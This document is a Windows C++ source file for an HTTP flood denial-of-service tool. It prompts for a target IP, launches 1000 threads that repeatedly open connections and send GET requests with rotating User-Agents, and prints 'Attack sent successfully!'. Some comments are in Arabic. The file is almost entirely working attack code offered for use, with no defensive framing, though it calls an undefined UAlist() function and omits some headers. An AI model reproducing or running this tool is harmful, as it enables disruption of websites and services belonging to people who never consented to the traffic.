#include <iostream>
#include <string>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

void http(const std::string& ip, int port, time_t floodtime) {
    while (time(nullptr) < floodtime) {
        SOCKET sock;
        sockaddr_in addr;
        WSADATA wsaData;

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed" << std::endl;
            return;
        }

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
            WSACleanup();
            return;
        }

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(ip.c_str());
        addr.sin_port = htons(port);

        if (connect(sock, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
            std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            WSACleanup();
            return;
        }

        std::string request = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: " + UAlist() + "\r\nConnection: keep-alive\r\n\r\n";
        send(sock, request.c_str(), request.length(), 0);
        std::cout << "\n [!] Attack sent successfully!\n";  // الرسالة التي تم إضافتها

        closesocket(sock);
        WSACleanup();
    }
}

void attack(const std::string& ip, int port, int threads, time_t duration) {
    time_t end_time = time(nullptr) + duration;
    for (int i = 0; i < threads; ++i) {
        std::thread(http, ip, port, end_time).detach();
    }
}

int main() {
    std::string ip;
    std::cout << "Target IP: ";
    std::cin >> ip;
    int port = 80;  // يمكنك تغيير البورت حسب الحاجة
    int threads = 1000;
    time_t duration = 1000;

    attack(ip, port, threads, duration);

    std::cin.get();
    return 0;
}